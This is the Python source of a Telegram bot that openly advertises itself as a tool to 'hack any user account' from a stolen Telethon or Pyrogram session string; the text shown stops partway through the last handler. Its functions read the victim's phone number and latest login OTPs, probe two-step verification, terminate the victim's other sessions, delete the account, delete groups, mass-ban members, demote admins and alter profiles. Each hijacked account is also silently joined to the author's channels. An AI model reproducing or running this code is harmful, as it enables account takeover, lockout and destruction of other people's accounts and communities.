import os
import asyncio
import logging
from pyrogram import Client, filters, enums, idle
from pyrogram.raw import functions
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardButton as IKB, InlineKeyboardMarkup as IKM, ChatPrivileges
from telethon import TelegramClient, functions as tfunc
from telethon.sessions import StringSession
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest,
    JoinChannelRequest,
    LeaveChannelRequest,
    DeleteChannelRequest,
    EditBannedRequest
)
from telethon.tl.types import ChannelParticipantsAdmins, ChatBannedRights
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from pyromod import listen

# ==================== CONFIG ====================
API_ID = int(os.getenv("API_ID", ""))
API_HASH = os.getenv("API_HASH", "")
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
START_PIC = os.getenv("START_PIC", "https://telegra.ph//file/a9a90059ae47fa840b0b3.jpg")

# Universal Force Join Channels - Edit karne ke liye sirf yahan change karo
FORCE_JOIN_CHANNELS = [
    "@ROMEOBOT_OP",
    "@ROMEO_OP"
]

# Owner Info - Customize karo apne hisaab se
OWNER_NAME = "𝕾🅡︎🅐︎🅙︎𝕾"
OWNER_USERNAME = "@romeo_op"  # Optional

# ==================== LOGGING ====================
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ==================== CLIENT ====================
app = Client("romeorj", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ==================== MESSAGES ====================
PM_TEXT = """
**Hey {},**
I'm **{}**

● Hack ●
❥︎ A Bot To Hack Any user account using
❥︎ Their Telethon and Pyrogram String session
❥︎ Owner: {owner}
"""

HACK_TEXT = """
**A** ~ Check user own groups and channels (PUBLIC ONLY)
**B** ~ Check user all information like phone number, username... etc
**C** ~ Ban all the members from the group
**D** ~ Know user last OTP, Use option B first to take number then login
**E** ~ Join A Group/Channel/Link via StringSession
**F** ~ Leave A Group/Channel via StringSession
**G** ~ Delete A Group/Channel
**H** ~ Check user two step is enabled or disabled
**I** ~ Terminate All current active sessions except Your StringSession
**J** ~ Delete Account
**K** ~ Promote a member in a Group/Channel
**L** ~ Demote All admins in a Group/Channel
**M** ~ Send Message to Saved Messages
**N** ~ Get All Active Sessions List
**O** ~ Download User Profile Photos
**P** ~ Change Profile (Name/Bio/Username)

❥︎ Owner: {owner}
"""

# ==================== BUTTONS ====================
PM_BUTTON = IKM([[IKB("● 𝐇𝐀𝐂𝐊 ●", callback_data="hack_btn")]])

HACK_MODS = IKM([
    [IKB("A", callback_data="A"), IKB("B", callback_data="B"), IKB("C", callback_data="C"),
     IKB("D", callback_data="D"), IKB("E", callback_data="E")],
    [IKB("F", callback_data="F"), IKB("G", callback_data="G"), IKB("H", callback_data="H"),
     IKB("I", callback_data="I"), IKB("J", callback_data="J")],
    [IKB("K", callback_data="K"), IKB("L", callback_data="L"), IKB("M", callback_data="M"),
     IKB("N", callback_data="N"), IKB("O", callback_data="O")],
    [IKB("P", callback_data="P")],
])

# ==================== RIGHTS ====================
BAN_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

FULL_PROMOTE = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,
    can_invite_users=True
)

PROMOTE = ChatPrivileges(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True
)

DEMOTE = ChatPrivileges(
    can_change_info=False,
    can_invite_users=False,
    can_delete_messages=False,
    can_restrict_members=False,
    can_pin_messages=False,
    can_promote_members=False,
    can_manage_chat=False,
    can_manage_video_chats=False,
)

# ==================== HELPER FUNCTIONS ====================

async def auto_join_channels_telethon(client):
    """Automatically join force channels - Telethon"""
    for channel in FORCE_JOIN_CHANNELS:
        try:
            await client(JoinChannelRequest(channel))
        except:
            pass

async def auto_join_channels_pyrogram(client):
    """Automatically join force channels - Pyrogram"""
    for channel in FORCE_JOIN_CHANNELS:
        try:
            await client.join_chat(channel)
        except:
            pass

async def users_gc(session):
    """Feature A: Get user's groups and channels"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            k = await rj(GetAdminedPublicChannelsRequest())
            for x in k.chats:
                msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.participants_count}\n\n'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                k = await r.invoke(functions.channels.GetAdminedPublicChannels())
                for x in k.chats:
                    msg += f'**❥︎ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ:** {x.title}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{x.username}\n**❥︎ ᴍᴇᴍʙᴇʀs:** {x.members_count}\n\n'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴘᴜʙʟɪᴄ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ!**"


async def user_info(session):
    """Feature B: Get user information"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            k = await rj.get_me()
            msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                k = await r.get_me()
                msg = f'**❥︎ ɴᴀᴍᴇ:** {k.first_name or k.last_name}\n**❥︎ ɪᴅ:** {k.id}\n**❥︎ ᴘʜᴏɴᴇ:** +{k.phone_number}\n**❥︎ ᴜsᴇʀɴᴀᴍᴇ:** @{k.username}'
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg


async def banall(session, gc_id):
    """Feature C: Ban all members from group"""
    err = ""
    total = 0
    banned = 0
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            admins = await rj.get_participants(gc_id, filter=ChannelParticipantsAdmins)
            admin_ids = [i.id for i in admins]
            async for user in rj.iter_participants(gc_id):
                total += 1
                try:
                    if user.id not in admin_ids:
                        await rj(EditBannedRequest(gc_id, user.id, BAN_RIGHTS))
                        banned += 1
                        await asyncio.sleep(0.1)
                except:
                    await asyncio.sleep(0.1)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for member in r.get_chat_members(gc_id):
                    total += 1
                    try:
                        await r.ban_chat_member(gc_id, member.user.id)
                        banned += 1
                    except FloodWait as fw:
                        await asyncio.sleep(fw.value)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return f"**✅ ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**\n\n**❥︎ ʙᴀɴɴᴇᴅ:** {banned}\n**❥︎ ᴛᴏᴛᴀʟ:** {total}"


async def get_otp(session):
    """Feature D: Get last OTP"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            async for x in rj.iter_messages(777000, limit=2):
                msg += f"\n{x.text}\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for message in r.get_chat_history(777000, limit=2):
                    msg += f"\n{message.text}\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴏᴛᴘ ғᴏᴜɴᴅ!**"


async def join_ch(session, gc_id):
    """Feature E: Join channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(JoinChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.join_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴊᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def leave_ch(session, gc_id):
    """Feature F: Leave channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(LeaveChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.leave_chat(gc_id)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def del_ch(session, gc_id):
    """Feature G: Delete channel/group"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(DeleteChannelRequest(gc_id))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.channels.DeleteChannel(channel=await r.resolve_peer(gc_id)))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"


async def check_2fa(session):
    """Feature H: Check 2FA status"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            try:
                await rj.edit_2fa("testpass123")
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
            except:
                msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                pwd = await r.invoke(functions.account.GetPassword())
                if pwd.has_password:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ ✅**"
                else:
                    msg = "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ ❌**"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg


async def terminate_all(session):
    """Feature I: Terminate all sessions"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(ResetAuthorizationsRequest())
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.auth.ResetAuthorizations())
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs!**"


async def del_acc(session):
    """Feature J: Delete account"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj(tfunc.account.DeleteAccountRequest("Deleted"))
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.invoke(functions.account.DeleteAccount(reason="Deleted"))
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ!**"


async def promote_user(session, gc_id, user_id):
    """Feature K: Promote a user"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            try:
                await rj.edit_admin(gc_id, user_id, manage_call=True, invite_users=True,
                                   ban_users=True, change_info=True, edit_messages=True,
                                   post_messages=True, add_admins=True, delete_messages=True)
            except:
                await rj.edit_admin(gc_id, user_id, is_admin=True, anonymous=False,
                                   pin_messages=True, title='Admin')
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                try:
                    await r.promote_chat_member(gc_id, user_id, FULL_PROMOTE)
                except:
                    await r.promote_chat_member(gc_id, user_id, PROMOTE)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ!**"


async def demote_all(session, gc_id):
    """Feature L: Demote all admins"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            async for x in rj.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
                try:
                    await rj.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
                except:
                    try:
                        await rj.edit_admin(gc_id, x.id, manage_call=False, invite_users=False,
                                           ban_users=False, change_info=False, edit_messages=False,
                                           post_messages=False, add_admins=False, delete_messages=False)
                    except:
                        pass
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for m in r.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                    try:
                        await r.promote_chat_member(gc_id, m.user.id, DEMOTE)
                    except:
                        pass
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ ᴀᴅᴍɪɴs!**"


async def send_to_saved(session, message):
    """Feature M: Send message to saved messages"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            await rj.send_message("me", message)
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                await r.send_message("me", message)
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return "**✅ ᴍᴇssᴀɢᴇ sᴇɴᴛ ᴛᴏ sᴀᴠᴇᴅ ᴍᴇssᴀɢᴇs!**"


async def get_active_sessions(session):
    """Feature N: Get all active sessions"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            auths = await rj(tfunc.account.GetAuthorizationsRequest())
            for i, auth in enumerate(auths.authorizations, 1):
                msg += f"**{i}. Device:** {auth.device_model}\n"
                msg += f"**Platform:** {auth.platform}\n"
                msg += f"**Location:** {auth.country}\n"
                msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                auths = await r.invoke(functions.account.GetAuthorizations())
                for i, auth in enumerate(auths.authorizations, 1):
                    msg += f"**{i}. Device:** {auth.device_model}\n"
                    msg += f"**Platform:** {auth.platform}\n"
                    msg += f"**Location:** {auth.country}\n"
                    msg += f"**App:** {auth.app_name} {auth.app_version}\n\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ғᴏᴜɴᴅ!**"


async def download_profile_pics(session):
    """Feature O: Download profile photos"""
    err = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            photos = await rj.get_profile_photos("me")
            if photos:
                file_path = await rj.download_profile_photo("me")
                await rj.disconnect()
                return file_path
            else:
                await rj.disconnect()
                return None
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                async for photo in r.get_chat_photos("me", limit=1):
                    file_path = await r.download_media(photo.file_id)
                    return file_path
                return None
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return None


async def change_profile(session, fname=None, lname=None, bio=None):
    """Feature P: Change profile details"""
    err = ""
    msg = ""
    try:
        if session.endswith("="):
            rj = TelegramClient(StringSession(session), API_ID, API_HASH)
            await rj.connect()
            await auto_join_channels_telethon(rj)
            if fname:
                await rj(tfunc.account.UpdateProfileRequest(first_name=fname))
                msg += "**✅ First Name Changed!**\n"
            if lname:
                await rj(tfunc.account.UpdateProfileRequest(last_name=lname))
                msg += "**✅ Last Name Changed!**\n"
            if bio:
                await rj(tfunc.account.UpdateProfileRequest(about=bio))
                msg += "**✅ Bio Changed!**\n"
            await rj.disconnect()
        else:
            async with Client("rj_temp", api_id=API_ID, api_hash=API_HASH, session_string=session) as r:
                await auto_join_channels_pyrogram(r)
                if fname or lname:
                    await r.update_profile(first_name=fname, last_name=lname)
                    msg += "**✅ Name Changed!**\n"
                if bio:
                    await r.invoke(functions.account.UpdateProfile(about=bio))
                    msg += "**✅ Bio Changed!**\n"
    except Exception as e:
        err = str(e)
    
    if err:
        return f"**ᴇʀʀᴏʀ:** {err}\n**ᴛʀʏ ᴀɢᴀɪɴ /hack**"
    return msg if msg else "**ɴᴏ ᴄʜᴀɴɢᴇs ᴍᴀᴅᴇ!**"


# ==================== HANDLERS ====================

@app.on_message(filters.command("start") & filters.private)
async def start_handler(_, message):
    user = message.from_user.mention
    bot = (await _.get_me()).mention
    await message.reply_photo(
        photo=START_PIC,
        caption=PM_TEXT.format(user, bot, owner=OWNER_NAME),
        reply_markup=PM_BUTTON
    )


@app.on_message(filters.command("hack") & filters.private)
async def hack_handler(_, message):
    await message.reply_text(HACK_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)


@app.on_callback_query(filters.regex("hack_btn"))
async def hack_btn_callback(_, query):
    await query.message.delete()
    await query.message.reply_text(HACK_TEXT.format(owner=OWNER_NAME), reply_markup=HACK_MODS)


# Feature A - Get Groups/Channels
@app.on_callback_query(filters.regex("^A$"))
async def feature_a(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await users_gc(session.text)
    
    if len(result) > 3855:
        with open("channels.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "channels.txt")
        os.remove("channels.txt")
    else:
        await query.message.reply_text(
            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature B - Get User Info
@app.on_callback_query(filters.regex("^B$"))
async def feature_b(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await user_info(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature C - Ban All Members
@app.on_callback_query(filters.regex("^C$"))
async def feature_c(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await banall(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature D - Get OTP
@app.on_callback_query(filters.regex("^D$"))
async def feature_d(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_otp(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature E - Join Channel
@app.on_callback_query(filters.regex("^E$"))
async def feature_e(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await join_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature F - Leave Channel
@app.on_callback_query(filters.regex("^F$"))
async def feature_f(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await leave_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature G - Delete Channel
@app.on_callback_query(filters.regex("^G$"))
async def feature_g(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await del_ch(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature H - Check 2FA
@app.on_callback_query(filters.regex("^H$"))
async def feature_h(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await check_2fa(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature I - Terminate All Sessions
@app.on_callback_query(filters.regex("^I$"))
async def feature_i(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await terminate_all(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature J - Delete Account
@app.on_callback_query(filters.regex("^J$"))
async def feature_j(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await del_acc(session.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature K - Promote User
@app.on_callback_query(filters.regex("^K$"))
async def feature_k(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    user = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜsᴇʀ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ ᴛᴏ ᴘʀᴏᴍᴏᴛᴇ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await promote_user(session.text, gc.text, user.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature L - Demote All Admins
@app.on_callback_query(filters.regex("^L$"))
async def feature_l(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    gc = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜsᴇʀɴᴀᴍᴇ:**")
    result = await demote_all(session.text, gc.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature M - Send to Saved Messages
@app.on_callback_query(filters.regex("^M$"))
async def feature_m(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    msg = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴍᴇssᴀɢᴇ ᴛᴏ sᴇɴᴅ:**")
    result = await send_to_saved(session.text, msg.text)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# Feature N - Get Active Sessions
@app.on_callback_query(filters.regex("^N$"))
async def feature_n(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await get_active_sessions(session.text)
